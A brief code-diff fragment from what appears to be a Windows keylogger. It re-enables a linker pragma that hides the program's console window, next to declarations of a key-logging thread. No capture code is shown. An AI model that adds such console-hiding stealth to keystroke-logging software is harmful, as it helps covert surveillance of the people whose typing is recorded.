@@ -9,7 +9,7 @@
 #pragma warning(disable:4996)
 #pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "msvcrt.lib")
-//#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // Hide console
+#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // Hide console
 
 HANDLE key_log_thread = { 0 };
 BOOL key_log_running = FALSE;
